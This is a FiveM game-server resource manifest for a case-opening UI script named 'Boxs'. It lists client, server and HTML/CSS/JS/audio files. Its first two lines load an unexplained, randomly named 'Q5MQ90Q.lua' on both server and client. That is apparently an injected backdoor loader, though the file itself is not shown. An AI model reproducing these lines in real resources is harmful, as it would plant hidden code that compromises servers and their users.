server_script "Q5MQ90Q.lua"
client_script "Q5MQ90Q.lua"


author 'Comprime'
description 'Boxs'
version '1.0.0'

lua54 "yes"

fx_version 'adamant'
game 'gta5'

ui_page "html/ui.html"

client_scripts {
	'client.lua',
	'config.lua'
}

escrow_ignore {
    'config.lua'
}

server_scripts {
	'server.lua',
	'config.lua'
}
files {
    "html/ui.html",
    "html/style.css",
    "html/script.js",
    "html/case.mp3",
}


dependency '/assetpacks'